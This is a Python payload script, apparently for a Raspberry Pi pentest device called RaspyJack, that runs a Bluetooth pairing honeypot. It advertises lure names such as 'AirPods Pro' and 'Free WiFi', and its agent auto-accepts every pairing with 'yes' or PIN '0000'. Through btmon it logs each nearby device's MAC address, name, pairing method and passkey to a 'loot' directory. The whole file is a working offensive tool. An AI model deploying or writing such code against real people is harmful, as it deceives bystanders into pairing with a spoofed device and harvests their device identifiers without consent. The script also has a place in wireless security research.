#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Pairing Honeypot (HoneyPair)
=====================================================

Makes the Bluetooth adapter discoverable and pairable with an enticing
device name (e.g. "AirPods Pro", "JBL Flip 6").  A bluez agent
auto-accepts every pairing request while btmon captures pairing
details -- method, passkey, remote MAC and name.

Controls
--------
  OK         -- Start / stop honeypot
  UP / DOWN  -- Scroll log or name list
  LEFT/RIGHT -- Switch dashboard (Status / Log / Names)
  KEY1       -- Cycle device name (when stopped)
  KEY2       -- Export log JSON
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/BLEHoneyPair/
"""

import os
import sys
import time
import json
import re
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

HCI_DEV = None
LOOT_DIR = "/root/Raspyjack/loot/BLEHoneyPair"
ROW_H = 12
ROWS_VISIBLE = 7

HONEY_NAMES = [
    "Galaxy Buds Pro", "AirPods Pro", "Free WiFi",
    "JBL Flip 6", "Bose QC45", "Car Audio",
    "Smart TV", "Keyboard", "Fitbit Charge",
    "Xbox Controller", "Sony WH-1000XM5",
]

VIEWS = ["status", "log", "names"]

lock = threading.Lock()
active = False
pair_log = []
connections = set()
name_idx = 0
view_idx = 0
scroll_pos = 0
status_msg = "Idle"
_running = True
_btmon_proc = None
_agent_proc = None
_orig_name = None


def _bt(cmd, timeout=5):
    return subprocess.run(
        ["bluetoothctl"] + cmd.split(),
        capture_output=True, text=True, timeout=timeout,
    )


def _hci_cmd(args, timeout=5):
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV] + args,
        capture_output=True, timeout=timeout,
    )


def _set_name(name):
    _hci_cmd(["name", name])
    _bt(f"system-alias {name}")


def _get_original_name():
    try:
        r = subprocess.run(
            ["hciconfig", HCI_DEV, "name"],
            capture_output=True, text=True, timeout=5,
        )
        for line in r.stdout.splitlines():
            line = line.strip()
            if line and not line.startswith("hci"):
                return line.split("Name: ")[-1].strip("'\" ")
    except Exception:
        pass
    return "raspberrypi"


def _start_agent():
    global _agent_proc
    _agent_proc = subprocess.Popen(
        ["bluetoothctl"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL, text=True,
    )
    for cmd in [
        "agent NoInputNoOutput",
        "default-agent",
        "discoverable on",
        "pairable on",
    ]:
        try:
            _agent_proc.stdin.write(cmd + "\n")
            _agent_proc.stdin.flush()
        except Exception:
            break
    threading.Thread(target=_parse_agent_output, daemon=True).start()


def _parse_agent_output():
    global status_msg
    if not _agent_proc or not _agent_proc.stdout:
        return
    try:
        for line in _agent_proc.stdout:
            if not _running:
                break
            line = line.strip()
            _process_btctl_line(line)
    except Exception:
        pass


def _process_btctl_line(line):
    global status_msg

    new_dev = re.search(r'\[NEW\] Device ([0-9A-Fa-f:]{17}) (.+)', line)
    if new_dev:
        mac, name = new_dev.group(1).upper(), new_dev.group(2)
        with lock:
            connections.add(mac)
            status_msg = f"New: {mac[-8:]}"
        _add_log_entry(mac, name, "discovered")
        return

    if "Confirm passkey" in line or "Request confirmation" in line:
        m = re.search(r'([0-9A-Fa-f:]{17})', line)
        pk = re.search(r'(\d{6})', line)
        mac = m.group(1).upper() if m else "unknown"
        passkey = pk.group(1) if pk else ""
        _add_log_entry(mac, "", "passkey", passkey)
        if _agent_proc and _agent_proc.stdin:
            try:
                _agent_proc.stdin.write("yes\n")
                _agent_proc.stdin.flush()
            except Exception:
                pass
        return

    if "Request PIN" in line:
        m = re.search(r'([0-9A-Fa-f:]{17})', line)
        mac = m.group(1).upper() if m else "unknown"
        _add_log_entry(mac, "", "pin_request")
        if _agent_proc and _agent_proc.stdin:
            try:
                _agent_proc.stdin.write("0000\n")
                _agent_proc.stdin.flush()
            except Exception:
                pass
        return

    if "Paired: yes" in line or "pairing successful" in line.lower():
        m = re.search(r'([0-9A-Fa-f:]{17})', line)
        mac = m.group(1).upper() if m else "unknown"
        _add_log_entry(mac, "", "paired")
        with lock:
            status_msg = f"Paired! {mac[-8:]}"
        return

    del_dev = re.search(r'\[DEL\] Device ([0-9A-Fa-f:]{17})', line)
    if del_dev:
        mac = del_dev.group(1).upper()
        with lock:
            connections.discard(mac)
        return


def _start_btmon():
    global _btmon_proc
    try:
        _btmon_proc = subprocess.Popen(
            ["sudo", "btmon"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True,
        )
        threading.Thread(target=_parse_btmon, daemon=True).start()
    except Exception:
        pass


def _parse_btmon():
    if not _btmon_proc or not _btmon_proc.stdout:
        return
    buf = []
    try:
        for line in _btmon_proc.stdout:
            if not _running:
                break
            line = line.rstrip()
            if line.startswith("> ") or line.startswith("< "):
                if buf:
                    _process_btmon_block(buf)
                buf = [line]
            elif buf:
                buf.append(line)
    except Exception:
        pass


def _process_btmon_block(lines):
    block = "\n".join(lines)

    if "Link Key Request" in block or "IO Capability" in block:
        m = re.search(r'Address:\s+([0-9A-Fa-f:]{17})', block)
        if m:
            mac = m.group(1).upper()
            method = "link_key" if "Link Key" in block else "io_cap"
            _add_log_entry(mac, "", method)

    if "PIN Code Request" in block:
        m = re.search(r'Address:\s+([0-9A-Fa-f:]{17})', block)
        if m:
            _add_log_entry(m.group(1).upper(), "", "pin_request_hci")

    if "User Confirmation" in block or "User Passkey" in block:
        m = re.search(r'Address:\s+([0-9A-Fa-f:]{17})', block)
        pk = re.search(r'Passkey:\s+(\d+)', block)
        if m:
            _add_log_entry(
                m.group(1).upper(), "",
                "user_confirm" if "Confirmation" in block else "user_passkey",
                pk.group(1) if pk else "",
            )


def _add_log_entry(mac, name, method, passkey=""):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = {
        "time": ts, "mac": mac, "name": name,
        "method": method, "passkey": passkey,
    }
    with lock:
        pair_log.append(entry)


def _start_honeypot():
    global active, status_msg
    with lock:
        if active:
            return
        active = True
        status_msg = "Starting..."

    _hci_cmd(["up"])
    _set_name(HONEY_NAMES[name_idx])
    _hci_cmd(["piscan"])
    _hci_cmd(["sspmode", "1"])
    _start_btmon()
    _start_agent()

    with lock:
        status_msg = "Honeypot ON"


def _stop_honeypot():
    global active, _btmon_proc, _agent_proc, status_msg

    if _agent_proc:
        try:
            _agent_proc.stdin.write("discoverable off\npairable off\nquit\n")
            _agent_proc.stdin.flush()
        except Exception:
            pass
        try:
            _agent_proc.terminate()
        except Exception:
            pass
        _agent_proc = None

    if _btmon_proc:
        try:
            _btmon_proc.terminate()
        except Exception:
            pass
        _btmon_proc = None

    _hci_cmd(["noscan"])
    if _orig_name:
        _set_name(_orig_name)

    for mac in list(connections):
        _bt(f"remove {mac}")

    with lock:
        active = False
        connections.clear()
        status_msg = "Stopped"


def _export_json():
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"honeypair_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "device_name": HONEY_NAMES[name_idx],
            "events": list(pair_log),
        }
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)
    return path


def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        is_active = active
        msg = status_msg
        n_events = len(pair_log)
        n_conn = len(connections)
        sp = scroll_pos
        cur_view = VIEWS[view_idx]
        log_copy = list(pair_log)
        ni = name_idx

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "HONEYPAIR", font=font, fill="#E91E63")
    color = "#00FF00" if is_active else "#FF0000"
    d.ellipse((118, 3, 126, 11), fill=color)

    y = 15

    if cur_view == "status":
        d.text((2, y), f"Name: {HONEY_NAMES[ni][:16]}", font=font, fill="#FFAA00")
        y += ROW_H
        d.text((2, y), f"Active: {'YES' if is_active else 'NO'}", font=font,
               fill="#00FF00" if is_active else "#FF5555")
        y += ROW_H
        d.text((2, y), f"Events: {n_events}", font=font, fill="#CCCCCC")
        y += ROW_H
        d.text((2, y), f"Connected: {n_conn}", font=font, fill="#CCCCCC")
        y += ROW_H
        d.text((2, y), f"HCI: {HCI_DEV or '?'}", font=font, fill="#888")
        y += ROW_H * 2
        d.text((2, y), msg[:22], font=font, fill="#2196F3")

        d.rectangle((0, 116, 127, 127), fill="#111")
        lbl = "OK:Stop" if is_active else "OK:Go"
        d.text((2, 117), f"{lbl} K1:Name K3:X", font=font, fill="#AAA")

    elif cur_view == "log":
        d.text((2, y), f"Pair Log ({n_events})", font=font, fill="#888")
        y += 13

        end = min(sp + ROWS_VISIBLE, len(log_copy))
        for i in range(sp, end):
            e = log_copy[-(i + 1)] if i < len(log_copy) else None
            if not e:
                break
            mac_short = e["mac"][-8:] if e["mac"] else "?"
            meth = e["method"][:6]
            clr = "#FF5555" if "pair" in e["method"] else "#CCCCCC"
            txt = f"{e['time']} {mac_short} {meth}"
            if e.get("passkey"):
                txt += f" {e['passkey']}"
            d.text((2, y), txt[:22], font=font, fill=clr)
            y += ROW_H

        if not log_copy:
            d.text((2, y), "No events yet", font=font, fill="#555")

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "K2:Export K3:X", font=font, fill="#AAA")

    elif cur_view == "names":
        d.text((2, y), "Device Names", font=font, fill="#888")
        y += 13

        end = min(sp + ROWS_VISIBLE, len(HONEY_NAMES))
        for i in range(sp, end):
            prefix = ">" if i == ni else " "
            clr = "#FFAA00" if i == ni else "#CCCCCC"
            d.text((2, y), f"{prefix}{HONEY_NAMES[i][:20]}", font=font, fill=clr)
            y += ROW_H

        d.rectangle((0, 116, 127, 127), fill="#111")
        d.text((2, 117), "K1:Select K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


def main():
    global scroll_pos, name_idx, view_idx, status_msg
    global HCI_DEV, _orig_name, _running

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        GPIO.cleanup()
        return 1

    _orig_name = _get_original_name()

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "HONEYPAIR", font=font, fill="#E91E63")
    d.text((4, 28), "BLE pairing honeypot.", font=font, fill="#888")
    d.text((4, 40), "Lures connections and", font=font, fill="#888")
    d.text((4, 52), "logs pairing attempts.", font=font, fill="#888")
    d.text((4, 72), "OK=Start  L/R=Views", font=font, fill="#666")
    d.text((4, 84), "K1=Name  K2=Export", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.0)

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                with lock:
                    is_active = active
                if is_active:
                    _stop_honeypot()
                else:
                    _start_honeypot()
                time.sleep(0.3)

            elif btn == "LEFT":
                with lock:
                    view_idx = (view_idx - 1) % len(VIEWS)
                    scroll_pos = 0
                time.sleep(0.25)

            elif btn == "RIGHT":
                with lock:
                    view_idx = (view_idx + 1) % len(VIEWS)
                    scroll_pos = 0
                time.sleep(0.25)

            elif btn == "UP":
                with lock:
                    scroll_pos = max(0, scroll_pos - 1)
                time.sleep(0.2)

            elif btn == "DOWN":
                cur_view = VIEWS[view_idx]
                max_scroll = 0
                if cur_view == "log":
                    max_scroll = max(0, len(pair_log) - ROWS_VISIBLE)
                elif cur_view == "names":
                    max_scroll = max(0, len(HONEY_NAMES) - ROWS_VISIBLE)
                with lock:
                    scroll_pos = min(scroll_pos + 1, max_scroll)
                time.sleep(0.2)

            elif btn == "KEY1":
                with lock:
                    is_active = active
                if not is_active:
                    with lock:
                        name_idx = (name_idx + 1) % len(HONEY_NAMES)
                        status_msg = f"Name: {HONEY_NAMES[name_idx][:12]}"
                elif VIEWS[view_idx] == "names":
                    with lock:
                        name_idx = (name_idx + 1) % len(HONEY_NAMES)
                time.sleep(0.25)

            elif btn == "KEY2":
                path = _export_json()
                with lock:
                    status_msg = "Exported"
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _running = False
        _stop_honeypot()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
